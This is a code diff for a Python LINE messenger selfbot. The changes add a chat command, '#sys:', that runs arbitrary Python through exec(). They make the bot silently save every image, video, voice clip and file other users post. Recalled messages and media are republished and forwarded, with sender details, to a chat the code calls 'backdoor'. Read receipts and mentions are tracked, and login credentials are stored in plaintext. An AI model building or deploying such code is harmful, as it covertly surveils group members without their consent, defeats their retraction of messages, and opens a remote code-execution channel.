@@ -1,21 +1,32 @@
 #reread
 from CHRLINE import *
-import os,json,codecs,time,sys,random
+import os,json,codecs,time,sys,random,contextlib
 from random import randint
+from io import StringIO
 
 
-backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
-admin = json.load(codecs.open("admin.json","r","utf-8"))
-creator = json.load(codecs.open("creator.json","r","utf-8"))
-settings = json.load(codecs.open("settings.json","r","utf-8"))
-reb = json.load(codecs.open("reb.json","r","utf-8"))
-red = json.load(codecs.open("red.json","r","utf-8"))
-game = json.load(codecs.open("game.json","r","utf-8"))
-reply = json.load(codecs.open("reply.json","r","utf-8"))
-wel = json.load(codecs.open("wel.json","r","utf-8"))
+backdoor = json.load(codecs.open("json/backdoor.json","r","utf-8"))
+admin = json.load(codecs.open("json/admin.json","r","utf-8"))
+creator = json.load(codecs.open("json/creator.json","r","utf-8"))
+settings = json.load(codecs.open("json/settings.json","r","utf-8"))
+reb = json.load(codecs.open("json/reb.json","r","utf-8"))
+red = json.load(codecs.open("json/red.json","r","utf-8"))
+game = json.load(codecs.open("json/game.json","r","utf-8"))
+reply = json.load(codecs.open("json/reply.json","r","utf-8"))
+wel = json.load(codecs.open("json/wel.json","r","utf-8"))
+rd = json.load(codecs.open("json/rd.json","r","utf-8"))
 bigdick = "u6155d5dac1395eab52faa16e832e5c65"
 mulai = time.time()
 cd = []
+
+@contextlib.contextmanager
+def stdoutIO(stdout=None):
+    old = sys.stdout
+    if stdout is None:
+        stdout = StringIO()
+    sys.stdout = stdout
+    yield stdout
+    sys.stdout = old
 def Runtime(secs):
     mins, secs = divmod(secs,60)
     hours, mins = divmod(mins,60)
@@ -28,20 +39,52 @@ def restart():
     os.execl(python, python, *sys.argv)
 def backupData():
     try:
-        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(red,codecs.open('red.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(game,codecs.open('game.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(reply,codecs.open('reply.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
-        json.dump(wel,codecs.open('wel.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(reb,codecs.open('json/reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(settings,codecs.open('json/settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(admin,codecs.open('json/admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(creator,codecs.open('json/creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(backdoor,codecs.open('json/backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(red,codecs.open('json/red.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(game,codecs.open('json/game.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(reply,codecs.open('json/reply.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(wel,codecs.open('json/wel.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(rd,codecs.open('json/rd.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
     except Exception as e:
         print(f'json backup error --> {e}')
-
+def alloff(g):
+    if g in red['reread']:
+        red['reread'].remove(g)
+    if g in game['game']:
+        game['game'].remove(g)
+    if g in game['1a2b']:
+        game['1a2b'].remove(g)
+    if g in game['guessnumber']:
+        game['guessnumber'].remove(g)
+    if g in game['1a2bans']:
+        del game['1a2bans'][g]
+    if g in game['guessnumberans']:
+        del game['guessnumberans'][g]
+    if g in game['guessnumberhigh']:
+        del game['guessnumberhigh'][g]
+    if g in game['guessnumberlow']:
+        del game['guessnumberlow'][g]
+    if g in reply['reply']:
+        reply['reply'].remove(g)
+    if g in wel['joinwel']:
+        wel['joinwel'].remove(g)
+    if g in wel['weltext']:
+        del wel['weltext'][g]
+    backupData()
+def allon(g):
+    if g not in red['reread']:
+        red['reread'].append(g)
+    if g not in game['game']:
+        game['game'].append(g)
+    if g not in reply['reply']:
+        reply['reply'].append(g)
+    backupData()
 try:
-    accountinfo=open('account.json','r').read()
+    accountinfo=open('json/account.json','r').read()
     email=accountinfo['email']
     password=accountinfo['password']
     token=accountinfo['token']
@@ -49,7 +92,7 @@ except:
     email=''
     password=''
     token=''
-    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))
+    open('json/account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))
 
 class bot:
     def __init__(self):
@@ -61,7 +104,7 @@ class bot:
                     self.han=CHRLINE(token,device="DESKTOPWIN")
                     print('Login By Token')
                 except Exception as e:
-                    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
+                    open('json/account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
                     print("Token Login failed\nReason:",e)
         elif email=="" or password=="":
             #account="ikdzcbgaztzeytgeyo@tmmcv.net" #chh5.0
@@ -70,7 +113,7 @@ class bot:
             try:
                 self.han=CHRLINE(account,password,device="DESKTOPWIN")
                 print('Login By Account and Password')
-                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
+                open('json/account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
             except Exception as e:
                 print("Password Login failed\nReason:",e)
                 os._exit(1)
@@ -81,7 +124,7 @@ class bot:
                 print('Login By Email and Password')
                 open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
             except Exception as e:
-                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
+                open('json/account.json','w').write(json.dumps({'email':'','password':'','token':''}))
                 print("Login failed\nReason:",e)
                 os._exit(1)
         try:
@@ -129,6 +172,24 @@ class bot:
         if bigdick not in creator['creator']:
             creator['creator'].append(bigdick)
             backupData()
+        if op[3] == 55:
+            # if op[11] in bigdick:
+            #     print("偵測已讀")
+            #     x = han.getContact(op[11])
+            #     han.sendMessage(op[10],f"{x[22]}已讀訊息")
+            if op[10] in rd['rd']:
+                if op[11] not in rd['rd'][op[10]]:
+                    rd['rd'][op[10]].append(op[11])
+                    backupData()
+            # try:    
+            #     a = json.load(codecs.open(f"標註查詢/{op[11]}.json","r","utf-8"))
+            #     if op[10] in a['x']:
+            #         print("偵測被標註者已讀")
+            #         a['x'].remove(op[10])
+            #         json.dump(a,codecs.open(f'標註查詢/{op[11]}.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+            #         han.sendMention(op[10],f"@!\n你已被提及\n可輸入誰標我來查詢",[op[11]])
+            # except:
+            #     pass
         if op[3] == 130:
             if op[10] in wel['joinwel'] and op[10] in wel['weltext']:
                 if "@!" in wel['weltext'][op[10]]:
@@ -150,16 +211,19 @@ class bot:
             if msg[15]==0:
                 if msg[1] in admin['admin'] or msg[1] in creator['creator']:
                     text=msg[10].lower()
-                    if to in reply['reply']:
-                        if msg[1] not in cd:
-                            if text in reply['textreply']:
-                                han.replyMessage(msg,reply['textreply'][text])
-                            if text in reply['contactreply']:
-                                han.sendContact(to,reply['contactreply'][text])
-                        cd.append(msg[1])
-                        time.sleep(1)
-                        cd.remove(msg[1])
                     match text:
+                        case '後台儲存':
+                            a = len([name for name in os.listdir('檔案/圖片') if os.path.isfile(os.path.join('檔案/圖片', name))]) 
+                            b = len([name for name in os.listdir('檔案/影片') if os.path.isfile(os.path.join('檔案/影片', name))]) 
+                            c = len([name for name in os.listdir('檔案/語音') if os.path.isfile(os.path.join('檔案/語音', name))]) 
+                            d = len([name for name in os.listdir('檔案/檔案') if os.path.isfile(os.path.join('檔案/檔案', name))]) 
+                            ret = 'ΞΞΞΞΞ〘儲存系統〙ΞΞΞΞΞ'
+                            ret += f'\n※圖片:{a}張'
+                            ret += f'\n※影片:{b}個'
+                            ret += f'\n※語音:{c}個'
+                            ret += f'\n※檔案:{d}個'
+                            ret += f'\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ'
+                            han.replyMessage(msg,ret)
                         case '收回':
                             msgid = msg.get(21)
                             if msgid != None:
@@ -357,27 +421,7 @@ class bot:
                                 print('al error-->'+str(e))
                         case '復讀 滾':
                             han.replyMessage(msg,"滾就滾 派殺小 幹")
-                            try:
-                                red['reread'].remove(to)
-                                backupData()
-                            except:
-                                pass
-                            try:
-                                game['game'].remove(to)
-                                del game['1a2b'][to]
-                                del game['1a2bans'][to]
-                                del game['guessnumber'][to]
-                                del game['guessnumberans'][to]
-                                del game['guessnumberhigh'][to]
-                                del game['guessnumberlow'][to]
-                                backupData()
-                            except:
-                                pass
-                            try:
-                                reply['reply'].remove(to)
-                                backupData()
-                            except:
-                                pass
+                            alloff(to)
                             han.deleteSelfFromChat(to) 
                             report(msg[2],msg[1],"退群指令觸發")
                         case '#lg':
@@ -452,6 +496,17 @@ class bot:
                             else:
                                 han.replyMessage(msg,"無權使用開發者指令")
                                 report(msg[2],msg[1],"管理員嘗試登出")
+                    if text.startswith('#sys:'):
+                        if msg[1] in creator['creator']:
+                            try:
+                                with stdoutIO() as s:
+                                    exec(msg[10][5:],globals(), locals())
+                                han.sendMessage(msg[2],'output -->\n'+s.getvalue(),relatedMessageId=msg[4])
+                            except Exception as e:
+                                han.sendMessage(msg[2],'error --> '+str(e),relatedMessageId=msg[4])
+                        else:
+                            han.replyMessage(msg,"無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用sys指令")
                     if text.startswith("#add"):
                         adminlist = []
                         adminlist2 = []
@@ -692,23 +747,8 @@ class bot:
                                 else:
                                     try:
                                         han.sendMessage(gid,"接收遠端退群指令")
+                                        alloff(gid)
                                         han.deleteSelfFromChat(gid)
-                                        try:
-                                            game['game'].remove(gid)
-                                            backupData()
-                                        except:
-                                            pass
-                                        try:
-                                            reply['reply'].remove(gid)
-                                            backupData()
-                                        except:
-                                            pass
-                                        try:
-                                            red['reread'].remove(gid)
-                                            backupData()
-                                        except:
-                                            pass
-                                        han.replyMessage(msg,"退群成功")
                                     except:
                                         han.replyMessage(msg, "我不在那個群組裡")  
                             except:
@@ -735,7 +775,7 @@ class bot:
                         else:
                             han.replyMessage(msg, "無權使用開發者指令")
                             report(msg[2],msg[1],"權限者嘗試更改個簽")
-                    elif text.startswith("cbk:"):
+                    elif text.startswith("#cbk:"):
                         if msg[1] in creator['creator']:
                             nb = msg[10][4:]
                             try:
@@ -756,6 +796,95 @@ class bot:
                             report(msg[2],msg[1],"管理員嘗試更改後台")  
                 if msg[1] not in cd:
                     text=msg[10].lower()
+                    if to in reply['reply']:
+                        if msg[1] not in cd:
+                            if text in reply['textreply']:
+                                han.replyMessage(msg,reply['textreply'][text])
+                            if text in reply['contactreply']:
+                                han.sendContact(to,reply['contactreply'][text])
+                        cd.append(msg[1])
+                        time.sleep(1)
+                        cd.remove(msg[1])
+                    if text == "sr":
+                        if to not in rd['rd']:
+                            rd['rd'][to] = []
+                            han.replyMessage(msg, "設置已讀點")
+                        else:
+                            rd['rd'][to] = []   
+                            han.replyMessage(msg, "重設已讀點")
+
+                        backupData()
+                        cd.append(msg[1])
+                        time.sleep(1)
+                        cd.remove(msg[1])
+                    if text == "cr":
+                        if to in rd['rd']:
+                            del rd['rd'][to]
+                            han.replyMessage(msg, "刪除已讀點")
+                        else:
+                            han.replyMessage(msg, "未設置已讀點")
+                        backupData()
+                        cd.append(msg[1])
+                        time.sleep(1)
+                        cd.remove(msg[1])
+                    if text == "lr":
+                        try:
+                            if to not in rd['rd']:
+                                han.replyMessage(msg,"未設置已讀點")
+                            else:
+                                mc = "ΞΞΞΞΞΞΞ〘已讀名單〙ΞΞΞΞΞΞΞ"
+                                no = 0 
+                                try:
+                                    for mi_d in rd['rd'][to]:
+                                        try:
+                                            no += 1
+                                            mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                        except:
+                                            print("錯誤:" +str(mi_d))
+                                    han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                except:
+                                    han.replyMessage(msg,"已讀【"+(str(len(admin)))+"】")
+                        except Exception as e:
+                            print('rd error-->'+str(e))
+                        cd.append(msg[1])
+                        time.sleep(1)
+                        cd.remove(msg[1])
+                    if text == "誰標我":
+                        try:
+                            a = json.loads(open(f'標註查詢/{msg[1]}.json','r').read())
+                            han.sendMessage(to, "查詢完畢",relatedMessageId=a['msgid'][to])
+                            del a['msgid'][to]
+                            json.dump(a,codecs.open(f'標註查詢/{msg[1]}.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+                        except:
+                            pass
+                    if '@' in text and "!" not in text:
+                        if msg[1] not in han.profile[1]:
+                            if 'MENTION' in msg[18]:
+                                print('偵測到標註')
+                                tags = eval(msg[18]["MENTION"])["MENTIONEES"][0]['M']
+                                try:
+                                    a = json.loads(open(f'標註查詢/{tags}.json','r').read())
+                                    a['msgid'][to] = msg[4]
+                                    a['x'].append(to)
+                                    json.dump(a,codecs.open(f'標註查詢/{op[11]}.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+                                except:
+                                    open(f'標註查詢/{tags}.json','w').write(json.dumps({'msgid':{to:msg[4]},"x":[to]}))
+                                    a = json.loads(open(f'標註查詢/{tags}.json','r').read())
+                                    json.dump(a,codecs.open(f'標註查詢/{tags}.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+                    if text == "#all on":
+                        allon(to)
+                        han.replyMessage(msg,"已開啟所有功能")
+                    if text == "#all off":
+                        alloff(to)
+                        han.replyMessage(msg,"已關閉所有功能")
+                    if '敢不敢' in text:
+                        a = '敢'
+                        b = '不敢'
+                        c = random.choice([a,b])
+                        han.replyMessage(msg, c)
+                        cd.append(msg[1])
+                        time.sleep(2)
+                        cd.remove(msg[1])
                     if '有沒有' in text:
                         a = '有'
                         b = '沒有'
@@ -1075,7 +1204,8 @@ class bot:
                             num = []
                             key = msg[10][5:].split(" ")
                             for i in key:
-                                num.append(i)
+                                if i.isdigit() == True:
+                                    num.append(i)    
                             if to not in game['1a2b']:
                                 if to not in game['guessnumber']:
                                     if len(num) == 2:
@@ -1158,7 +1288,7 @@ class bot:
                                     else:
                                         game['guessnumberhigh'][to] = guess
                                         backupData()
-                                    if to not in game['guessnumberlow'][to] or to not in game['guessnumberhigh'][to] or guess <= game['guessnumberlow'][to] or guess >= game['guessnumberhigh'][to]:
+                                    if to not in game['guessnumberlow'] or to not in game['guessnumberhigh'] or guess <= game['guessnumberlow'] or guess >= game['guessnumberhigh']  :
                                         pass
                                     else:
                                         han.replyMessage(msg,f"數字介於{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}之間")
@@ -1219,11 +1349,10 @@ class bot:
                                 cd.append(msg[1])
                                 time.sleep(2)
                                 cd.remove(msg[1])
-                                
-                        
-
-
             if msg[15] == 1:
+                #han.downloadObjectMsg(msg[4],path=f"檔案/圖片/{str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(msg[5]/1000)))))}.jpg")
+                if msg[1] not in han.profile[1]:
+                    han.downloadObjectMsg(msg[4],path=f"檔案/圖片/{msg[4]}.jpg")
                 if settings["pic"] == True:
                     if msg[1] in settings["picmid"]:
                         try:
@@ -1262,6 +1391,21 @@ class bot:
                             settings["covermid"] = [] 
                             backupData()
                             os.remove("cover.jpg")
+            if msg[15] == 2:
+                #han.downloadObjectMsg(msg[4],path=f"檔案/影片/{str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(msg[5]/1000)))))}.mp4")
+                if msg[1] not in han.profile[1]:
+                    try:
+                        han.downloadObjectMsg(msg[4],path=f"檔案/影片/{msg[4]}.mp4")
+                    except Exception as e:
+                        print(e)
+            if msg[15] == 3:
+                #han.downloadObjectMsg(msg[4],path=f"檔案/語音/{str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(msg[5]/1000)))))}.mp3")
+                if msg[1] not in han.profile[1]:
+                    han.downloadObjectMsg(msg[4],path=f"檔案/語音/{msg[4]}.mp3")
+            if msg[15] == 14:
+                #han.downloadObjectMsg(msg[4],path=f"檔案/檔案/{str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(msg[5]/1000)))))}.zip")
+                if msg[1] not in han.profile[1]:
+                    han.downloadObjectMsg(msg[4],path=f"檔案/檔案/{msg[4]}")
         if op[3] == 65:
             gid = op[10]
             msgid = op[11]
@@ -1276,12 +1420,14 @@ class bot:
                 if target_msg[1] not in cd:
                     if target_msg[15] == 0:
                         text = target_msg[10]
-                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        stime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(op[2]/1000))))))
                         group = han.getChats([gid])[1][0][6]
                         user = han.getContact(target_msg[1])[22]
                         if gid in red['reread']:
                             a = f"@chrline\n"
                             a += f"※收回訊息:\n{text}"
+                            a += f"\n※發送時間:\n{stime}"
                             a += f"\n※收回時間:\n{unstime}"
                             arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
                             tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
@@ -1292,42 +1438,138 @@ class bot:
                         txt += "※訊息類別:文字\n"
                         txt += f"※群組:\n{group}\n{gid}"
                         txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                        txt += f"\n※發送時間:\n{stime}"
                         txt += f"\n※收回時間:\n{unstime}"
                         txt += f"\n※訊息內容:\n{text}"
-                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                        txt += "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
                         han.sendMessage(backdoor['backdoor'], txt)
                         cd.append(target_msg[1])
                         time.sleep(2)
                         cd.remove(target_msg[1])
 
-                    # if target_msg[15] == 1:
-                    #     han.downloadObjectMsg(target_msg[4],path="unsend.jpg")
-                    #     unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
-                    #     group = han.getChats([gid])[1][0][6]
-                    #     user = han.getContact(target_msg[1])[22]
-                    #     if gid in red['reread']:
-                    #         a = f"@chrline\n"
-                    #         a += f"※收回圖片:下方"
-                    #         a += f"\n※收回時間:\n{unstime}"
-                    #         arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
-                    #         tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
-                    #         han.sendMessage(gid, a,contentMetadata=tag)
-                    #         han.sendImage(gid,"unsend.jpg")
-                    #     else: 
-                    #         pass
-                    #     txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
-                    #     txt += "※訊息類別:圖片\n"
-                    #     txt += f"※群組:\n{group}\n{gid}"
-                    #     txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
-                    #     txt += f"\n※收回時間:\n{unstime}"
-                    #     txt += f"\n※訊息內容:\n下方圖片"
-                    #     txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
-                    #     han.sendMessage(backdoor['backdoor'], txt)
-                    #     han.sendImage(backdoor['backdoor'],"test.jpg")
-                    #     os.remove("unsend.jpg")
-                    #     cd.append(target_msg[1])
-                    #     time.sleep(2)
-                    #     cd.remove(target_msg[1])
+                    if target_msg[15] == 1:
+                        stime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(op[2]/1000))))))
+                        group = han.getChats([gid])[1][0][6]
+                        user = han.getContact(target_msg[1])[22]
+                        if gid in red['reread']:
+                            a = f"@chrline\n"
+                            a += f"※收回訊息:\n下方圖片"
+                            a += f"\n※發送時間:\n{stime}"
+                            a += f"\n※收回時間:\n{unstime}"
+                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
+                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
+                            han.sendMessage(gid, a,contentMetadata=tag)
+                            han.sendImage(gid,"檔案/圖片/{}.jpg".format(target_msg[4]))
+                        else: 
+                            pass
+                        txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                        txt += "※訊息類別:圖片\n"
+                        txt += f"※群組:\n{group}\n{gid}"
+                        txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                        txt += f"\n※發送時間:\n{stime}"
+                        txt += f"\n※收回時間:\n{unstime}"
+                        txt += f"\n※訊息內容:\n下方圖片"
+                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                        han.sendMessage(backdoor['backdoor'], txt)
+                        han.sendImage(backdoor['backdoor'],"檔案/圖片/{}.jpg".format(target_msg[4]))
+                        #os.remove("unsend.jpg")
+                        cd.append(target_msg[1])
+                        time.sleep(2)
+                        cd.remove(target_msg[1])
+
+                    if target_msg[15] == 2:
+                        stime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(op[2]/1000))))))
+                        group = han.getChats([gid])[1][0][6]
+                        user = han.getContact(target_msg[1])[22]
+                        if gid in red['reread']:
+                            a = f"@chrline\n"
+                            a += f"※收回訊息:\n下方影片"
+                            a += f"\n※發送時間:\n{stime}"
+                            a += f"\n※收回時間:\n{unstime}"
+                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
+                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
+                            han.sendMessage(gid, a,contentMetadata=tag)
+                            han.sendVideo(gid,"檔案/影片/{}.mp4".format(target_msg[4]))
+                        else: 
+                            pass
+                        txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                        txt += "※訊息類別:影片\n"
+                        txt += f"※群組:\n{group}\n{gid}"
+                        txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                        txt += f"\n※發送時間:\n{stime}"
+                        txt += f"\n※收回時間:\n{unstime}"
+                        txt += f"\n※訊息內容:\n下方影片"
+                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                        han.sendMessage(backdoor['backdoor'], txt)
+                        han.sendVideo(backdoor['backdoor'],"檔案/影片/{}.mp4".format(target_msg[4]))
+                        #os.remove("unsend.jpg")
+                        cd.append(target_msg[1])
+                        time.sleep(2)
+                        cd.remove(target_msg[1])
+
+                    if target_msg[15] == 3:
+                        stime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(op[2]/1000))))))
+                        group = han.getChats([gid])[1][0][6]
+                        user = han.getContact(target_msg[1])[22]
+                        if gid in red['reread']:
+                            a = f"@chrline\n"
+                            a += f"※收回訊息:\n下方音檔"
+                            a += f"\n※發送時間:\n{stime}"
+                            a += f"\n※收回時間:\n{unstime}"
+                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
+                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
+                            han.sendMessage(gid, a,contentMetadata=tag)
+                            han.sendAudio(gid,"檔案/語音/{}.mp3".format(target_msg[4]))
+                        else: 
+                            pass
+                        txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                        txt += "※訊息類別:音檔\n"
+                        txt += f"※群組:\n{group}\n{gid}"
+                        txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                        txt += f"\n※發送時間:\n{stime}"
+                        txt += f"\n※收回時間:\n{unstime}"
+                        txt += f"\n※訊息內容:\n下方音檔"
+                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                        han.sendMessage(backdoor['backdoor'], txt)
+                        han.sendAudio(backdoor['backdoor'],"檔案/語音/{}.mp3".format(target_msg[4]))
+                        #os.remove("unsend.jpg")
+                        cd.append(target_msg[1])
+                        time.sleep(2)
+                        cd.remove(target_msg[1])
+
+                    if target_msg[15] == 14:
+                        stime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(op[2]/1000))))))
+                        group = han.getChats([gid])[1][0][6]
+                        user = han.getContact(target_msg[1])[22]
+                        if gid in red['reread']:
+                            a = f"@chrline\n"
+                            a += f"※收回訊息:\n下方檔案"
+                            a += f"\n※發送時間:\n{stime}"
+                            a += f"\n※收回時間:\n{unstime}"
+                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
+                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
+                            han.sendMessage(gid, a,contentMetadata=tag)
+                            han.sendFile(gid,"檔案/檔案/{}".format(target_msg[4]))
+                        else: 
+                            pass
+                        txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                        txt += "※訊息類別:檔案\n"
+                        txt += f"※群組:\n{group}\n{gid}"
+                        txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                        txt += f"\n※發送時間:\n{stime}"
+                        txt += f"\n※收回時間:\n{unstime}"
+                        txt += f"\n※訊息內容:\n下方檔案"
+                        txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                        han.sendMessage(backdoor['backdoor'], txt)
+                        han.sendFile(backdoor['backdoor'],"檔案/檔案/{}".format(target_msg[4]))
+                        #os.remove("unsend.jpg")
+                        cd.append(target_msg[1])
+                        time.sleep(2)
+                        cd.remove(target_msg[1])
 
 
 
